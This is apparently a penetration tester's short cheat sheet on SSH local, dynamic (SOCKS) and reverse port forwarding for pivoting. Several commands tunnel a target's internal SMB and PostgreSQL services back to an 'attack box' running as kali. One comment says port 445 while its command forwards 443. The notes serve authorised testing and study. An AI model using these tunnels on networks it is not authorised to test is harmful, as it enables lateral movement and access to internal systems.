---
tags:
  - tool
  - routing
---
# ssh

Connect to linux machines

## Capabilities

### Local Fowarding

```powershell
# Forward traffic from our localhost over port 3000 to the target host port 3000
ssh -L 3000:127.0.0.1:3000 $USER@$IP

# Connect to 10.0.0.10 and listen on 4455, forwarding to 172.16.20.1:445
ssh -N -L 0.0.0.0:4455:172.16.20.1:445 database_admin@10.0.0.10

# Connect to 10.0.0.10 and listen on 1080, forwarding all traffic (simulating a SOCKS proxy)
ssh -N -D 0.0.0.0:1080 database_admin@10.0.0.10
```

### Remote Fowarding (reverse)

```powershell
# Forward traffic on port 445 from the target to our local host
ssh -R 8443:127.0.0.1:443 $USER@$IP

# Connect to our attack box, listen on port 2345, and forward all traffic to 10.0.0.10:5432
ssh -N -R 127.0.0.1:2345:10.0.0.10:5432 kali@$OUR_IP

# Connect to our attack box, and act as a SOCKS proxy operating on port 1080
ssh -N -R 1080 kali@$OUR_IP
```

REDACTED THEORY
